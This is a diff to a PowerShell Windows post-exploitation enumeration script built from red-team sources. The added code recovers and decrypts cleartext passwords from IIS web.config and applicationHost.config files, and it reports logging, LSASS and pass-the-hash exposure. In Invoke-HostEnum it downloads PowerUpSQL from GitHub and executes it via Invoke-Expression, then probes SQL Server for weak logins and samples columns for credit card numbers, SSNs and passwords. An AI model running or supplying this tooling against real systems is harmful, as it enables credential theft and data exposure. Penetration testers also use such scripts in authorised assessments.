@@ -4,6 +4,52 @@ function Get-LocalAdministrators {
     $list = Get-WmiObject win32_groupuser -Filter $query | foreach {[wmi]$_.PartComponent} 
     return $list 
 }
+function Get-LocalPSRemoters {
+    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-580'"
+    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
+    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {[wmi]$_.PartComponent} 
+    return $list 
+}
+function Get-SysInfo {
+    <#
+    https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
+    .SYNOPSIS
+    Get basic system information from the host
+    #>
+    $os_info = gwmi Win32_OperatingSystem
+    $date = Get-Date
+    $IsHighIntegrity = [bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    
+    $SysInfoHash = @{            
+        HOSTNAME                = $ENV:COMPUTERNAME                         
+        IPADDRESSES             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
+        OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
+        ARCHITECTURE            = $os_info.OSArchitecture   
+        "DATE(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
+        "DATE(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
+        INSTALLDATE             = $os_info.InstallDate
+        USERNAME                = $ENV:USERNAME           
+        DOMAIN                  = (GWMI Win32_ComputerSystem).domain            
+        LOGONSERVER             = $ENV:LOGONSERVER          
+        PSVERSION               = $PSVersionTable.PSVersion.ToString()
+        PSCOMPATIBLEVERSIONS    = ($PSVersionTable.PSCompatibleVersions) -join ', '
+        PSSCRIPTBLOCKLOGGING    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
+        PSTRANSCRIPTION         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
+        PSTRANSCRIPTIONDIR      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
+        PSMODULELOGGING         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -EA 0).EnableModuleLogging -eq 1){"Enabled"} Else {"Disabled"}
+        LSASSPROTECTION         = If((Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA 0).RunAsPPL -eq 1){"Enabled"} Else {"Disabled"}
+        LAPS                    = If((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -EA 0).AdmPwdEnabled -eq 1){"Enabled"} Else {"Disabled"}
+        UACLOCALACCOUNTTOKENFILTERPOLICY = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).LocalAccountTokenFilterPolicy -eq 1){"Disabled (PTH likely w/ non-RID500 Local Admins)"} Else {"Enabled (Remote Administration restricted for non-RID500 Local Admins)"}
+        UACFILTERADMINISTRATORTOKEN = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).FilterAdministratorToken -eq 1){"Enabled (RID500 protected)"} Else {"Disabled (PTH likely with RID500 Account)"}
+        HIGHINTEGRITY           = $IsHighIntegrity
+        DENYRDPCONNECTIONS      = [bool](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -EA 0).FDenyTSConnections
+        LOCALADMINS             = ((Get-LocalAdministrators).name -join ', ')
+        LOCALPSREMOTE           = ((Get-LocalPSRemoters).name -join ', ')
+    }      
+    # PS feels the need to randomly re-order everything when converted to an object so let's presort
+    $SysInfoObject = New-Object -TypeName PSobject -Property $SysInfoHash 
+    return $SysInfoObject | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, IPAddresses, Domain, Username, LogonServer, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, LSASSProtection, LAPS, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, HighIntegrity, DENYRDPCONNECTIONS, LOCALADMINS, LOCALPSREMOTE
+}
 function Get-LocalSecurityProducts {
     <#
     Modified https://github.com/HarmJ0y/WINspect/blob/master/WINspect.ps1
@@ -174,48 +220,6 @@ function Get-LocalSecurityProducts {
     $SecObject = New-Object -TypeName PSobject -Property $SecInfoHash
     return $SecObject | Select-Object 'Domain Profile Firewall','Standard Profile Firewall','Public Profile Firewall','AntiVirus installed?','AV*','AntiSpyware installed?','Spyware*','FW*'
 }
-function Get-SysInfo {
-    <#
-    https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
-    .SYNOPSIS
-    Get basic system information from the host
-    #>
-    param(
-        [string[]]$Admins
-    )
-    $os_info = gwmi Win32_OperatingSystem
-    $date = Get-Date
-    $IsHighIntegrity = [bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-    
-    $SysInfoHash = @{            
-        HOSTNAME                = $ENV:COMPUTERNAME                         
-        IPADDRESSES             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
-        OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
-        ARCHITECTURE            = $os_info.OSArchitecture   
-        "DATE(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
-        "DATE(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
-        INSTALLDATE             = $os_info.InstallDate
-        USERNAME                = $ENV:USERNAME           
-        DOMAIN                  = (GWMI Win32_ComputerSystem).domain            
-        LOGONSERVER             = $ENV:LOGONSERVER          
-        PSVERSION               = $PSVersionTable.PSVersion.ToString()
-        PSCOMPATIBLEVERSIONS    = ($PSVersionTable.PSCompatibleVersions) -join ', '
-        PSSCRIPTBLOCKLOGGING    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
-        PSTRANSCRIPTION         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
-        PSTRANSCRIPTIONDIR      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
-        PSMODULELOGGING         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -EA 0).EnableModuleLogging -eq 1){"Enabled"} Else {"Disabled"}
-        LSASSPROTECTION         = If((Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA 0).RunAsPPL -eq 1){"Enabled"} Else {"Disabled"}
-        LAPS                    = If((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -EA 0).AdmPwdEnabled -eq 1){"Enabled"} Else {"Disabled"}
-        UACLOCALACCOUNTTOKENFILTERPOLICY = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).LocalAccountTokenFilterPolicy -eq 1){"Disabled (PTH likely w/ non-RID500 Local Admins)"} Else {"Enabled (Remote Administration restricted for non-RID500 Local Admins)"}
-        UACFILTERADMINISTRATORTOKEN = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).FilterAdministratorToken -eq 1){"Enabled (RID500 protected)"} Else {"Disabled (PTH likely with RID500 Account)"}
-        HIGHINTEGRITY           = $IsHighIntegrity
-        DENYRDPCONNECTIONS      = [bool](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -EA 0).FDenyTSConnections
-        LOCALADMINS             = $Admins.name -join ', '
-    }      
-    # PS feels the need to randomly re-order everything when converted to an object so let's presort
-    $SysInfoObject = New-Object -TypeName PSobject -Property $SysInfoHash 
-    return $SysInfoObject | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, IPAddresses, Domain, Username, LogonServer, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, LSASSProtection, LAPS, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, HighIntegrity, DENYRDPCONNECTIONS, LOCALADMINS
-}
 function Get-ModifiablePath {
     <#
     .SYNOPSIS
@@ -347,7 +351,7 @@ function Get-ModifiablePath {
             #        }
             #    }
             #}
-            #$CandidatePaths takes too long
+            #$CandidatePaths makes the scan from to be 4 seconds to 7.5 seconds
             $TargetPath | Sort-Object -Unique | ForEach-Object {
                 $CandidatePath = $_
                 Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
@@ -1069,9 +1073,415 @@ function Get-RegistryAlwaysInstallElevated {
     }
     $ErrorActionPreference = $OrigError
 }
-function Invoke-WinEnum{
+function Get-WebConfig {
+    <#
+    .SYNOPSIS
+    This script will recover cleartext and encrypted connection strings from all web.config
+    files on the system. Also, it will decrypt them if needed.
+    Author: Scott Sutherland, Antti Rantasaari  
+    License: BSD 3-Clause  
+    Required Dependencies: None  
+    .DESCRIPTION
+    This script will identify all of the web.config files on the system and recover the
+    connection strings used to support authentication to backend databases.  If needed, the
+    script will also decrypt the connection strings on the fly.  The output supports the
+    pipeline which can be used to convert all of the results into a pretty table by piping
+    to format-table.
+    .EXAMPLE
+    Return a list of cleartext and decrypted connect strings from web.config files.
+    Get-WebConfig
+    user   : s1admin
+    pass   : s1password
+    dbserv : 192.168.1.103\server1
+    vdir   : C:\test2
+    path   : C:\test2\web.config
+    encr   : No
+    user   : s1user
+    pass   : s1password
+    dbserv : 192.168.1.103\server1
+    vdir   : C:\inetpub\wwwroot
+    path   : C:\inetpub\wwwroot\web.config
+    encr   : Yes
+    .EXAMPLE
+    Return a list of clear text and decrypted connect strings from web.config files.
+    Get-WebConfig | Format-Table -Autosize
+    user    pass       dbserv                vdir               path                          encr
+    ----    ----       ------                ----               ----                          ----
+    s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No
+    s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No
+    s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No
+    s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes
+    s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No
+    .OUTPUTS
+    System.Boolean
+    System.Data.DataTable
+    .LINK
+    https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
+    http://www.netspi.com
+    https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
+    http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
+    http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
+    .NOTES
+    Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
+    for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
+    Author: Scott Sutherland - 2014, NetSPI
+    Author: Antti Rantasaari - 2014, NetSPI
+    #>
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
+    [OutputType('System.Boolean')]
+    [OutputType('System.Data.DataTable')]
+    [CmdletBinding()]
+    Param()
+
+    $OrigError = $ErrorActionPreference
+    $ErrorActionPreference = 'SilentlyContinue'
+
+    # Check if appcmd.exe exists
+    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
+
+        # Create data table to house results
+        $DataTable = New-Object System.Data.DataTable
+
+        # Create and name columns in the data table
+        $Null = $DataTable.Columns.Add('user')
+        $Null = $DataTable.Columns.Add('pass')
+        $Null = $DataTable.Columns.Add('dbserv')
+        $Null = $DataTable.Columns.Add('vdir')
+        $Null = $DataTable.Columns.Add('path')
+        $Null = $DataTable.Columns.Add('encr')
+
+        # Get list of virtual directories in IIS
+        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
+        ForEach-Object {
+
+            $CurrentVdir = $_
+
+            # Converts CMD style env vars (%) to powershell env vars (env)
+            if ($_ -like "*%*") {
+                $EnvarName = "`$Env:"+$_.split("%")[1]
+                $EnvarValue = Invoke-Expression $EnvarName
+                $RestofPath = $_.split('%')[2]
+                $CurrentVdir  = $EnvarValue+$RestofPath
+            }
+
+            # Search for web.config files in each virtual directory
+            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
+
+                # Set web.config path
+                $CurrentPath = $_.fullname
+
+                # Read the data from the web.config xml file
+                [xml]$ConfigFile = Get-Content $_.fullname
+
+                # Check if the connectionStrings are encrypted
+                if ($ConfigFile.configuration.connectionStrings.add) {
+
+                    # Foreach connection string add to data table
+                    $ConfigFile.configuration.connectionStrings.add|
+                    ForEach-Object {
+
+                        [String]$MyConString = $_.connectionString
+                        if ($MyConString -like '*password*') {
+                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
+                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
+                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
+                            $ConfVdir = $CurrentVdir
+                            $ConfEnc = 'No'
+                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
+                        }
+                    }
+                }
+                else {
+
+                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
+                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1
+
+                    # Check if aspnet_regiis.exe exists
+                    if (Test-Path  ($AspnetRegiisPath.FullName)) {
+
+                        # Setup path for temp web.config to the current user's temp dir
+                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'
+
+                        # Remove existing temp web.config
+                        if (Test-Path  ($WebConfigPath)) {
+                            Remove-Item $WebConfigPath
+                        }
+
+                        # Copy web.config from vdir to user temp for decryption
+                        Copy-Item $CurrentPath $WebConfigPath
+
+                        # Decrypt web.config in user temp
+                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
+                        $Null = Invoke-Expression $AspnetRegiisCmd
+
+                        # Read the data from the web.config in temp
+                        [xml]$TMPConfigFile = Get-Content $WebConfigPath
+
+                        # Check if the connectionStrings are still encrypted
+                        if ($TMPConfigFile.configuration.connectionStrings.add) {
+
+                            # Foreach connection string add to data table
+                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {
+
+                                [String]$MyConString = $_.connectionString
+                                if ($MyConString -like '*password*') {
+                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
+                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
+                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
+                                    $ConfVdir = $CurrentVdir
+                                    $ConfEnc = 'Yes'
+                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
+                                }
+                            }
+                        }
+                        else {
+                            Write-Verbose "Decryption of $CurrentPath failed."
+                            $False
+                        }
+                    }
+                    else {
+                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
+                        $False
+                    }
+                }
+            }
+        }
+
+        # Check if any connection strings were found
+        if ( $DataTable.rows.Count -gt 0 ) {
+            # Display results in list view that can feed into the pipeline
+            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
+        }
+        else {
+            Write-Verbose 'No connection strings found.'
+            $False
+        }
+    }
+    else {
+        Write-Verbose 'Appcmd.exe does not exist in the default location.'
+        $False
+    }
+    $ErrorActionPreference = $OrigError
+}
+function Get-ApplicationHost {
+    <#
+    .SYNOPSIS
+    Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
+    Author: Scott Sutherland  
+    License: BSD 3-Clause  
+    Required Dependencies: None  
+    .DESCRIPTION
+    This script will decrypt and recover application pool and virtual directory passwords
+    from the applicationHost.config file on the system.  The output supports the
+    pipeline which can be used to convert all of the results into a pretty table by piping
+    to format-table.
+    .EXAMPLE
+    Return application pool and virtual directory passwords from the applicationHost.config on the system.
+    Get-ApplicationHost
+    user    : PoolUser1
+    pass    : PoolParty1!
+    type    : Application Pool
+    vdir    : NA
+    apppool : ApplicationPool1
+    user    : PoolUser2
+    pass    : PoolParty2!
+    type    : Application Pool
+    vdir    : NA
+    apppool : ApplicationPool2
+    user    : VdirUser1
+    pass    : VdirPassword1!
+    type    : Virtual Directory
+    vdir    : site1/vdir1/
+    apppool : NA
+    user    : VdirUser2
+    pass    : VdirPassword2!
+    type    : Virtual Directory
+    vdir    : site2/
+    apppool : NA
+    .EXAMPLE
+    Return a list of cleartext and decrypted connect strings from web.config files.
+    Get-ApplicationHost | Format-Table -Autosize
+    user          pass               type              vdir         apppool
+    ----          ----               ----              ----         -------
+    PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
+    PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
+    VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
+    VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA
+    .OUTPUTS
+    System.Data.DataTable
+    System.Boolean
+    .LINK
+    https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
+    http://www.netspi.com
+    http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
+    http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
+    .NOTES
+    Author: Scott Sutherland - 2014, NetSPI
+    Version: Get-ApplicationHost v1.0
+    Comments: Should work on IIS 6 and Above
+    #>
+    
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
+    [OutputType('System.Data.DataTable')]
+    [OutputType('System.Boolean')]
+    [CmdletBinding()]
+    Param()
+
+    $OrigError = $ErrorActionPreference
+    $ErrorActionPreference = 'SilentlyContinue'
+
+    # Check if appcmd.exe exists
+    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
+        # Create data table to house results
+        $DataTable = New-Object System.Data.DataTable
+
+        # Create and name columns in the data table
+        $Null = $DataTable.Columns.Add('user')
+        $Null = $DataTable.Columns.Add('pass')
+        $Null = $DataTable.Columns.Add('type')
+        $Null = $DataTable.Columns.Add('vdir')
+        $Null = $DataTable.Columns.Add('apppool')
+
+        # Get list of application pools
+        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
+
+            # Get application pool name
+            $PoolName = $_
+
+            # Get username
+            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
+            $PoolUser = Invoke-Expression $PoolUserCmd
+
+            # Get password
+            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
+            $PoolPassword = Invoke-Expression $PoolPasswordCmd
+
+            # Check if credentials exists
+            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
+                # Add credentials to database
+                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
+            }
+        }
+
+        # Get list of virtual directories
+        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
+
+            # Get Virtual Directory Name
+            $VdirName = $_
+
+            # Get username
+            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
+            $VdirUser = Invoke-Expression $VdirUserCmd
+
+            # Get password
+            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
+            $VdirPassword = Invoke-Expression $VdirPasswordCmd
+
+            # Check if credentials exists
+            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
+                # Add credentials to database
+                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
+            }
+        }
+
+        # Check if any passwords were found
+        if ( $DataTable.rows.Count -gt 0 ) {
+            # Display results in list view that can feed into the pipeline
+            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
+        }
+        else {
+            # Status user
+            Write-Verbose 'No application pool or virtual directory passwords were found.'
+            $False
+        }
+    }
+    else {
+        Write-Verbose 'Appcmd.exe does not exist in the default location.'
+        $False
+    }
+    $ErrorActionPreference = $OrigError
+}
+function Invoke-HostEnum {
+    <#
+    Checking Installed Software, If iis is installed run addition checks
+    if mssql is installed download PowerUpSQL.ps1 and audits the databases
+    #>
+    Write-Output "[*] Installed Software"
+    (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, Publisher, InstallDate)
+    if((Test-Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\")){
+        Write-Output "[*] Starting MSSQL Audit"
+        $url="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1"
+        Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
+        $instances = Get-SQLInstanceLocal | Select-Object instance | Sort-Object -Unique 
+        foreach($Instance in $instances){
+            $instanceinfo = $instance | Get-SQLServerInfo
+            if($instanceinfo){
+                    $instanceinfo
+                    #test if SQL Server is configured with default passwords.
+                    $instanceinfo | Invoke-SQLAuditDefaultLoginPw 
+                    # enumerateSQL Server logins and the current login and test for "username" as password for each enumerated login.
+                    $instanceinfo | Invoke-SQLAuditWeakLoginPw 
+                    #Check if any SQL Server links are configured with remote credentials.
+                    $instanceinfo | Invoke-SQLAuditPrivServerLink 
+                    #SQL Server Links
+                    $instanceinfo | Get-SQLServerLinkCrawl 
+                    #Check if any databases have been configured as trustworthy
+                    $instanceinfo | Invoke-SQLAuditPrivTrustworthy 
+                    #Check if data ownership chaining is enabled at the server or databases levels.
+                    $instanceinfo | Invoke-SQLAuditPrivDbChaining 
+                    #This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
+                    $instanceinfo | Invoke-SQLAuditSQLiSpExecuteAs 
+                    #This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
+                    $instanceinfo | Invoke-SQLAuditSQLiSpSigned 
+                    #heck if any databases have been configured as trustworthy.
+                    $instanceinfo | Invoke-SQLAuditPrivAutoExecSp 
+                    #Non default database status
+                    $instanceinfo | Get-SQLDatabase  -NoDefaults 
+                    #acl for database path
+                    $instanceinfo | Get-SQLDatabase | Sort-Object -Unique -Property FileName | foreach {Get-ModifiablePath -Path $_.FileName -ErrorAction Continue}
+                    #sql users
+                    $instanceinfo | Get-SQLServerRoleMember 
+                    $instanceinfo | Get-SQLColumnSampleDataThreaded  -Threads 20 -Keyword  "credit,ssn,password" -SampleSize 2 -ValidateCC -NoDefaults
+                    #search database for keywords in non default databases
+            }else{
+                Write-Output "[-] Cant Enumerate Instance $($Instance.Instance)"
+            }
+        }
+    }
+    if(Test-Path "HKLM:\SOFTWARE\Microsoft\InetStp\"){
+        Write-Output "[*] Starting IIS testing"
+        #Recover cleartext and encrypted connection strings from all web.config files on the system. Also, it will decrypt them if needed.
+        Write-Output "[*] Checking WebConfig"
+        try{
+            Get-WebConfig
+        }catch{
+            Write-Output "[-] Checking WebConfig Failed"
+        }
+        #Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
+        Write-Output "[*] Checking Application Pool"
+        try{
+            Get-ApplicationHost
+        }catch{
+            Write-Output "[-] Checking Application Pool Failed"
+        }
+    }
+    $OSinfo = (Get-CimInstance -ClassName Win32_OperatingSystem).ProductType
+    if($OSinfo -eq 1){
+        #Write-Output "[*] Starting Workstation testing"
+
+    }elseif($OSinfo -eq 2){
+        #Write-Output "[*] Starting Domain Controller testing"
+
+    }elseif($OSinfo -eq 3){
+        #Write-Output "[*] Starting Server testing"
+    }
+}
+function Invoke-WinEnum {
     #
     $timer = [Diagnostics.Stopwatch]::StartNew()
+    #Get Local admins for acl checking
     $LocalAdmins = Get-LocalAdministrators
     $Admins = @(
         'System',
@@ -1082,7 +1492,7 @@ function Invoke-WinEnum{
     )
     Write-Output "`n[*] Checking System Information"
     try{
-        Get-SysInfo -Admins $Admins
+        Get-SysInfo
     }catch{
         Write-Output "[-] SysInfo Failed"
     }
@@ -1220,6 +1630,10 @@ function Invoke-WinEnum{
     }catch{
         "[-] Checking Active Listenings Failed"
     }
+    
+    Write-Output "`n[*] Enumerating host.."
+    Invoke-HostEnum | Format-List
+    
     Write-Output "Scan took $($timer.Elapsed.TotalSeconds) Seconds"
     $timer.Stop()
 }
